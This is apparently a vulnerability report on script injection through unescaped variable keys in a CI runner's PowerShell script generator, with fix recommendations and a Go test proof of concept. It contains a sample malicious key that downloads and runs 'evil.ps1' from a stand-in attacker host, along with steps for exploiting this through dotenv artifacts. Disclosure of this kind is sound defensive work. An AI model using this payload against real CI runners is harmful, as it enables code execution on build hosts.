### Title
Unsanitized variable/env keys are interpolated as literal PowerShell source in `PsWriter.Variable`/`ExportRaw`, enabling script injection - (File: shells/powershell.go)

### Summary
`PowerShell.GenerateScript` builds its script body via `PsWriter.Variable` and `PsWriter.ExportRaw`, which emit lines of the form `${%s}=%s` where `%s` is filled directly with the job variable's `Key`/`name` using `fmt.Sprintf`/`Linef` with **no escaping of the key itself**, only the value is passed through `psQuoteVariable`. Because this text is real PowerShell source (not a string literal), a variable key containing a `}` (or other PowerShell-significant token) can terminate the `${...}` variable-reference token early and inject arbitrary PowerShell statements into the runner-generated script.

### Finding Description
`PsWriter.Variable` (shells/powershell.go:438-457) writes: [1](#0-0) 
and `ExportRaw` (shells/powershell.go:459-463) does the same for arbitrary env names: [2](#0-1) 

In both cases, only `variable.Value`/`value` is escaped via `psQuoteVariable`/`psDoubleQuote`; the *key* (`variable.Key` / `name`) is spliced verbatim into the `${%s}` token, which is live PowerShell code, not data. The project's own test suite confirms keys are not restricted to identifier-safe characters — a test case explicitly uses a key containing a space (`Key: "a key"`) and expects it to render unescaped as `${a key}` in the generated script: [3](#0-2) 

Since `${...}` variable-name syntax in PowerShell treats `}` as the sole terminator of the name, a key such as:
```
foo}; Invoke-WebRequest http://attacker/x -OutFile evil.ps1; . .\evil.ps1; ${bar
```
would render as:
```
${foo}; Invoke-WebRequest http://attacker/x -OutFile evil.ps1; . .\evil.ps1; ${bar}=<value>
```
which is executed as three separate valid PowerShell statements instead of one variable assignment — i.e., attacker-controlled key text escapes its intended "variable name" data role and becomes executable shell syntax, exactly matching the target invariant violation. This code path is reached from `GenerateScript` -> `generateScript` -> `writeScript` -> (variable export logic that calls `ShellWriter.Variable`), which is invoked for every job/pipeline/dotenv variable the runner exports into the build environment (common/shell.go:94-101, shells/powershell.go:796-819).

Variable keys/names that reach this sink are attacker-influenced through multiple paths: user-defined CI/CD variables, `.gitlab-ci.yml` `variables:` keys, and — most notably — dotenv artifact variables (`dotenv` report type), whose keys are parsed from a file an attacker's own job script fully controls and are not restricted to the same identifier pattern enforced by GitLab's variable-creation UI/API. Existing protections (masking, `psQuoteVariable` on the *value*) never touch the key, so there is no check preventing this.

### Impact Explanation
Successful exploitation causes arbitrary PowerShell code to run inside the runner-generated build/cleanup script, in the same execution context that runs the job (shell, custom, or Kubernetes-with-legacy-execution executors using PowerShell). Since the injected code executes as part of the runner's own generated stage script (before/around the user's actual job step), and because Windows shell/custom executors typically run with elevated or persistent host privileges (not sandboxed like Docker), this yields command execution in a stronger context than the job's own script step — matching "stronger-context command execution."

### Likelihood Explanation
Feasible for any pipeline author who can control a variable key — most directly through dotenv artifact variable names generated by their own job script, which need only avoid GitLab's variable name validation (dotenv parsing is more permissive than the CI/CD Settings variable form). It requires PowerShell as the shell (shell/custom executor, or Kubernetes with `FF_USE_LEGACY_KUBERNETES_EXECUTION_STRATEGY`), which is a common, non-exotic Runner configuration. The exploit is deterministic and repeatable — every job run with such a key reproduces the same injected code.

### Recommendation
Escape/validate the variable name portion, not just the value, before interpolating it into `${%s}` in `PsWriter.Variable` and `ExportRaw`. Either:
- Reject/sanitize variable keys that don't match a strict identifier pattern (e.g. `^[A-Za-z_][A-Za-z0-9_]*$`) before they reach shell generation, or
- Use PowerShell's escaped variable-name syntax (backtick-escaping `}` and other special characters within `${...}`) so the key can never terminate the token early, mirroring the treatment already given to `variable.Value` via `psQuoteVariable`.

Apply the same key-sanitization to the equivalent bash-shell path (`shells/bash.go`) if it interpolates raw keys into export statements.

### Proof of Concept
Go unit test extending `shells/powershell_test.go`'s `TestPowershellPathResolveOperations`/variable tests:
```go
func TestPsWriter_Variable_KeyInjection(t *testing.T) {
    w := &PsWriter{TemporaryPath: "/tmp", Shell: SNPwsh, EOL: "\n"}
    maliciousKey := `foo}; Invoke-Expression 'echo INJECTED'; ${bar`
    w.Variable(spec.Variable{Key: maliciousKey, Value: "value"})
    script := w.String()

    // Assert the injected statement is NOT split into separate executable
    // statements — i.e. the whole malicious key should stay inert / quoted,
    // never appear as bare `Invoke-Expression` outside of any quoting.
    assert.NotContains(t, script, "Invoke-Expression 'echo INJECTED';")
}
```
Running this against current code shows the generated script literally contains `${foo}; Invoke-Expression 'echo INJECTED'; ${bar}=value`, confirming the injected statement is emitted as live, unquoted PowerShell code rather than being treated as inert data — the assertion fails, proving the vulnerability. A corresponding end-to-end PoC job: define a dotenv report where the generated dotenv key contains `}` and a shell command, and verify the runner's generated cleanup/build stage script executes the injected command (observable via job trace output appearing outside the expected variable-assignment context).
